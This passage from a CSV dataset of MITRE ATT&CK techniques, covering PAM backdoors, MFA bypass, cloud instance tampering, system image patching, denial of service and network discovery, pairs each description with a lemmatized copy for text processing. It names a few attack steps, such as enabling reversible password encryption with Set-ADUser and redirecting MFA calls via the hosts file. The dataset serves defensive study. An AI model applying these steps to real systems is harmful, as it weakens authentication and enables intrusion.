change effect register filter acknowledge validation adversary register malicious password filter harvest credential local computer entire domain perform proper validation filter receive plain text credential lsa malicious password filter receive plain text credential time password request
T1556.003,Modify Authentication Process: Pluggable Authentication Modules,"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.Adversaries may modify components of the PAM system to create backdoors. PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.",adversary modify pluggable authentication module pam access user credential enable unwarranted access account pam modular system configuration file library executable file guide authentication service common authentication module retrieve set verify account authentication information passwd shadow adversary modify component pam system create backdoor pam component patch accept arbitrary adversary supply value legitimate credential malicious modification pam system abuse steal credential adversary infect pam resource code harvest user credential value exchange pam component plain text pam store password
T1556.004,Modify Authentication Process: Network Device Authentication,"Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.Modify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password. The modification includes a specific password which is implanted in the operating system image via the patch. Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.",adversary use patch system image hard code password operate system bypass native authentication mechanism local account network device modify system image include implant code operate system network device provide access adversary specific password modification include specific password implant operate system image patch authentication attempt insert code check user input password access grant implant code pass credential verification potentially valid credential
T1556.005,Modify Authentication Process: Reversible Encryption,"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:Encrypted password (G$RADIUSCHAP) from the Active Directory user-structure userParameters16 byte randomly-generated value (G$RADIUSCHAPKEY) also from userParametersGlobal LSA secret (G$MSRADIUSCHAPKEY)Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL)With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to ""Windows Server 2008"" or higher. In PowerShell, an adversary may make associated changes to user settings using commands similar to Set-ADUser -AllowReversiblePasswordEncryption $true.",adversary abuse active directory authentication encryption property gain access credential windows system allowreversiblepasswordencryption property specify reversible password encryption account enable disable default property disabled instead store user credential output way hashing function enable legacy software require property enable user change password enable adversary able obtain plaintext password create change property enable decrypt password adversary need component encrypt password active directory user structure byte randomly generate value userparametersglobal lsa secret key hardcode remote access subauthentication dll information adversary able reproduce encryption key subsequently decrypt encrypt password value adversary set property scope local group policy editor user property fine grained password policy fgpp activedirectory powershell module example adversary implement apply fgpp user group domain functional level set windows server high powershell adversary associate change user setting command similar set aduser true
T1556.006,Modify Authentication Process: Multi-Factor Authentication,"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.For example, modifying the Windows hosts file (C:\windows\system32\drivers\etc\hosts) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a ""fail open"" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.",adversary disable modify multi factor authentication mfa mechanism enable persistent access compromise account adversary gain access network compromise account lack mfa employ mfa bypass method multi factor authentication request generation adversary leverage access modify completely disable mfa defense accomplish abuse legitimate feature exclude user azure ad conditional access policies register new vulnerable adversary control mfa method manually patch mfa program configuration file bypass expected functionality example modify windows host file redirect mfa call localhost instead mfa server cause mfa process fail fail open policy place successful authentication attempt grant access enforce mfa depend scope goal privilege adversary mfa defense disable individual account account tie large group domain account victim network environment
T1556.007,Modify Authentication Process: Hybrid Identity,"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts. Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD:Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure ADAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the AzureADConnectAuthenticationAgentService process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.",adversary patch modify backdoor cloud authentication process tie premises user identity order bypass typical authentication mechanism access credential enable persistent access account organization maintain hybrid user device identity share premise cloud base environment maintain number way example azure ad include option synchronize identity active directory azure ad password hash synchronization phs privileged premises account synchronize user password hash active directory azure ad allow authentication azure ad place entirely cloud pass authentication pta azure ad authentication attempt forward premise pta agent validate credential active directory active directory federation services ad fs trust relationship establish active directory azure adad fs saas cloud platform aws gcp hand authentication process ad fs receive token contain hybrid user identity privilege modify authentication process tie hybrid identity adversary able establish persistent privileged access cloud resource example adversary compromise premises server run pta agent inject malicious dll azureadconnectauthenticationagentservice process authorize attempt authenticate azure ad record user credential case adversary able modify hybrid identity authentication process cloud example adversary compromise global administrator account azure ad tenant able register new pta agent web console similarly allow harvest credential log azure ad environment user
T1556.008,Modify Authentication Process: Network Provider DLL,"Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. Adversaries can configure a malicious network provider DLL to receive credentials from mpnotify.exe.Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.",adversary register malicious network provider dynamic link library dlls capture cleartext user credential authentication process network provider dll allow windows interface specific network protocol support add credential management function adversary configure malicious network provider dll receive credential adversary target plant malicious network provider dll system know increase logon activity administrator logon activity server domain controller
T1578,Modify Cloud Compute Infrastructure,"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.",adversary attempt modify cloud account compute service infrastructure evade defense modification compute service infrastructure include creation deletion modification component compute instance virtual machine snapshot permission gain modification infrastructure component bypass restriction prevent access exist infrastructure modify infrastructure component allow adversary evade detection remove evidence presence
T1578.001,Modify Cloud Compute Infrastructure: Create Snapshot,"An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.An adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.",adversary create snapshot datum backup cloud account evade defense snapshot point time copy exist cloud compute component virtual machine vm virtual hard drive volume adversary leverage permission create snapshot order bypass restriction prevent access exist compute service infrastructure unlike revert cloud instance adversary revert snapshot evade detection remove evidence presence adversary create cloud instance mount create snapshot instance apply policy allow adversary access create instance firewall policy allow inbound outbound ssh access
T1578.002,Modify Cloud Compute Infrastructure: Create Cloud Instance,"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging.Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",adversary create new instance virtual machine vm compute service cloud account evade defense create new instance allow adversary bypass firewall rule permission exist instance currently reside account adversary create snapshot volume account create new instance mount snapshot apply restrictive security policy collect datum local system remote data staging create new instance allow adversary carry malicious activity environment affect execution current run instance
T1578.003,Modify Cloud Compute Infrastructure: Delete Cloud Instance,An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence. Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.An adversary may also Create Cloud Instance and later terminate the instance after achieving their objectives.,adversary delete cloud instance perform malicious activity attempt evade detection remove evidence presence delete instance virtual machine remove valuable forensic artifact evidence suspicious behavior instance recoverable adversary create cloud instance later terminate instance achieve objective
T1578.004,Modify Cloud Compute Infrastructure: Revert Cloud Instance,"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.",adversary revert change cloud instance perform malicious activity attempt evade detection remove evidence presence highly virtualize environment cloud base infrastructure accomplish restore virtual machine vm datum storage snapshot cloud management dashboard cloud api variation technique utilize temporary storage attach compute instance cloud provider provide type storage include persistent local ephemeral ephemeral type reset stop restart vm
T1112,Modify Registry,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",adversary interact windows registry hide configuration information registry key remove information cleaning technique aid persistence execution access specific area registry depend account permission require administrator level access build windows command line utility reg local remote registry modification tool remote access tool contain functionality interact registry windows modification include action hide key prepende key name null character cause error ignore read reg utility api registry remote system modify aid execution file lateral movement require remote registry service run target system valid account require access remote system smb windows admin shares rpc communication
T1601,Modify System Image,"Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves. On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it. This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",adversary change operate system embed network device weaken defense provide new capability device operate system typically monolithic device functionality capability contain single file change operate system adversary typically need affect file replace modify live memory system runtime immediate effect storage implement change boot network device
T1601.001,Modify System Image: Patch System Image,"Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses. Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file. Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection. The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system. This method typically requires administrative level access to the device.In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system. Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit method, to directly manipulate running operating system code in memory. This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging. Adding new capabilities for the adversary’s purpose include Keylogging, Multi-hop Proxy, and Port Knocking.Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders. When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system. By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via TFTP Boot. When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots. However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.",adversary modify operate system network device introduce new capability weaken existing defense network device build monolithic architecture entire operate system functionality device contain single file adversary change file storage load future boot memory runtime change operate system storage adversary typically use standard procedure available device operator involve download new file typical protocol network device tftp ftp scp console connection original file overwrite new file write alongside device reconfigure boot compromise image change operate system memory adversary typically use method adversary use native debug command original unaltered run operate system allow directly modify relevant memory address contain run operate system method typically require administrative level access device second method change operate system memory adversary use boot loader boot loader piece software load device start turn launch operate system adversary use malicious code previously implant boot loader rommonkit method directly manipulate run operate system code memory malicious code bootloader provide capability direct memory manipulation adversary allow patch live operate system runtime modify instruction store system image file adversary weaken exist defense provision new capability device example exist defense impede include encryption weaken encryption authentication network device authentication perimeter defense network boundary bridging add new capability adversary purpose include keylogging multi hop proxy port knocking adversary compromise exist command operate system produce false output mislead defender method conjunction downgrade system image example compromise system command include change output command show version currently run operate system patch operate system adversary change command instead display original high revision number replace system downgrade operate system patch storage achieve resident storage typically form flash memory non volatile tftp boot technique perform run operate system memory store copy technique survive reboot live memory modification operate system combine rommonkit achieve persistence
T1601.002,Modify System Image: Downgrade System Image,"Adversaries may install an older version of the operating system of a network device to weaken security. Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. On embedded devices, downgrading the version typically only requires replacing the operating system file in storage. With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart. The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as Weaken Encryption. Downgrading of a system image can be done on its own, or it can be used in conjunction with Patch System Image.",adversary install old version operate system network device weaken security old operate system version network device weak encryption cipher general few update defensive feature embed device downgrade version typically require replace operate system file storage embed device achieve download copy desire version operate system file reconfigure device boot file system restart adversary restart device implement change immediately wait time system restart downgrade system image old version allow adversary evade defense enable behavior weaken encryption downgrading system image conjunction patch system image
T1111,Multi-Factor Authentication Interception,"Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones.",adversary target multi factor authentication mfa mechanism smart card token generator etc gain access credential access system service network resource use mfa recommend provide high level security username password organization aware technique intercept bypass security mechanism smart card multi factor authentication keylogger need obtain password associate smart card normal use insert card access smart card password adversary connect network resource infected system proxy authentication insert hardware token adversary employ keylogger similarly target hardware token rsa securid capture token input include user personal identification code provide temporary access replay time passcode value rollover possibly enable adversary reliably predict future authentication value give access algorithm seed value generate append temporary code method mfa intercept adversary authenticate common time code send band communication email sms device service secure vulnerable interception service provider target example adversary compromise sms messaging service order steal mfa code send user phone
T1621,Multi-Factor Authentication Request Generation,"Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.Adversaries in possession of credentials to Valid Accounts may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account.In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to ""MFA fatigue.""",adversary attempt bypass multi factor authentication mfa mechanism gain access account generate mfa request send user adversary possession credential valid accounts unable complete login process lack access mfa mechanism require additional credential security control circumvent adversary abuse automatic generation push notification mfa service duo push microsoft authenticator okta similar service user grant access account case adversary continuously repeat login attempt order bombard user mfa push notification sms message phone call potentially result user finally accept authentication request response mfa fatigue
T1104,Multi-Stage Channels,"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.",adversary create multiple stage command control employ different condition certain function use multiple stage obfuscate command control channel detection difficult remote access tool stage command control server instruction stage automated capability collect basic host information update tool upload additional file second remote access tool rat upload point redirect host second stage command control server second stage likely fully feature allow adversary interact system reverse shell additional rat feature different stage likely host separately overlap infrastructure loader backup stage callback fallback channels case original stage communication path discover block
T1106,Native API,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.Native API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via Disable or Modify Tools).",adversary interact native os application programming interface api execute behavior native api provide controlled means call low level os service kernel involve hardware device memory process native api leverage os system boot system component initialize carry task request routine operation native api function ntcreateprocess direct invoke system call syscall feature expose user mode application interface library high level software framework microsoft macos cocoa available interact native api framework typically provide language wrapper abstraction api functionality design ease use portability code adversary abuse os api function means execute behavior similar command scripting interpreter native api hierarchy interface provide mechanism interact utilize component victimize system invoke api function adversary attempt bypass defensive tool ex unhook monitor function disable modify tool
T1599,Network Boundary Bridging,"Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks. They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections. Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications. To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance. By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy or exfiltration of data via Traffic Duplication. Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals. In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",adversary bridge network boundary compromise perimeter network device internal device responsible network segmentation breach device enable adversary bypass restriction traffic routing separate trusted untrusted network device router firewall create boundary trusted untrusted network achieve restrict traffic type enforce organizational policy attempt reduce risk inherent connection restriction traffic achieve prohibit ip address layer protocol port deep packet inspection identify application participate rest network device directly addressable transparent mode operation bearing adversary bypass compromise adversary take control boundary device bypass policy enforcement pass normally prohibit traffic trust boundary separate network hinderance achieve sufficient right device adversary reconfigure device allow traffic want allow achieve goal command control multi hop proxy exfiltration datum traffic duplication adversary target internal device responsible network segmentation abuse conjunction internal proxy achieve goal case border device separate separate organization adversary facilitate lateral movement new victim environment
T1599.001,Network Boundary Bridging: Network Address Translation Traversal,"Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device. A typical example of this is environments where internal networks make use of non-Internet routable addresses.When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design. In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device. In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders. Adversaries may use Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",adversary bridge network boundary modify network device network address translation nat configuration malicious modification nat enable adversary bypass restriction traffic routing separate trusted untrusted network network device router firewall connect multiple network implement nat process pass packet network perform nat network device rewrite source destination address ip address header network design require nat packet cross border device typical example environment internal network use non internet routable address adversary gain control network boundary device leverage exist nat configuration send traffic separate network implement nat configuration design case network design require nat function enable adversary overcome inherent routing limitation normally prevent access protect system border device case network design require nat address translation adversary obscure activity change address packet traverse network boundary device monitor datum transmission challenging defender adversary use patch system image change operate system network device implement custom nat mechanism obscure activity
T1498,Network Denial of Service,"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposesA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.For DoS attacks targeting the hosting system directly, see Endpoint Denial of Service.",adversary perform network denial service dos attack degrade block availability target resource user network dos perform exhaust network bandwidth service rely example resource include specific website email service dns web base application adversary observe conduct network dos attack political purposesa network dos occur bandwidth capacity network connection system exhaust volume malicious traffic direct resource network connection network device resource rely example adversary send traffic server host network connection internet traffic generate single system multiple system spread internet commonly refer distribute dos perform network dos attack aspect apply multiple method include ip address spoofing botnet adversary use original ip address attack system spoof source ip address attack traffic difficult trace attack system enable reflection increase difficulty defender defend attack reduce eliminate effectiveness filter source address network defense device dos attack target host system directly endpoint denial service
T1498.001,Network Denial of Service: Direct Network Flood,"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.",adversary attempt cause denial service dos directly send high volume network traffic target dos attack reduce availability functionality target network direct network flood system send high volume network packet target service network network protocol flooding stateless protocol udp icmp commonly stateful protocol tcp botnet commonly conduct network flooding attack network service large botnet generate significant traffic system spread global internet adversary resource build control botnet infrastructure rent time exist botnet conduct attack bad case distribute dos ddos system generate flood need send small traffic produce volume saturate target network circumstance distinguish ddos traffic legitimate client exceedingly difficult botnet high profile ddos flooding attack series incident target major bank
T1498.002,Network Denial of Service: Reflection Amplification,"Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target. This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS",adversary attempt cause denial service dos reflect high volume network traffic target type network dos take advantage party server intermediary host respond give spoofed source ip address party server commonly term reflector adversary accomplish reflection attack send packet reflector spoofed address victim similar direct network floods system conduct attack botnet likewise reflector focus traffic target network dos attack reduce availability functionality target network reflection attack advantage protocol large response request order amplify traffic commonly know reflection amplification attack adversary able generate increase volume attack traffic order magnitude great request send amplifier extent increase depend variable protocol question technique amplify server actually produce amplification attack volume prominent protocol enable reflection amplification floods dns
T1046,Network Service Discovery,"Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system. Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as dns-sd -B _ssh._tcp .) to find other systems broadcasting the ssh service.",adversary attempt listing service run remote host local network infrastructure device include vulnerable remote software exploitation common method acquire information include port vulnerability scan tool bring system cloud environment adversary attempt discover service run cloud host additionally cloud environment connect premise environment adversary able identify service run non cloud system macos environment adversary use native bonjour application discover service run macos host network bonjour mdnsresponder daemon automatically register advertise host register service network example adversary use mdns query dns sd find system broadcast ssh service
T1135,Network Share Discovery,"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. File sharing over a Windows network occurs over the SMB protocol. Net can be used to query a remote system for available shared drives using the net view \\remotesystem command. It can also be used to query shared drives on the local system using net share. For macOS, the sharing -l command lists all shared points used for smb services.",adversary look folder drive share remote system means identify source information gather precursor collection identify potential system interest lateral movement network contain share network drive folder enable user access file directory system network file sharing windows network occur smb protocol net query remote system available share drive net view command query share drive local system net share macos sharing command list share point smb service
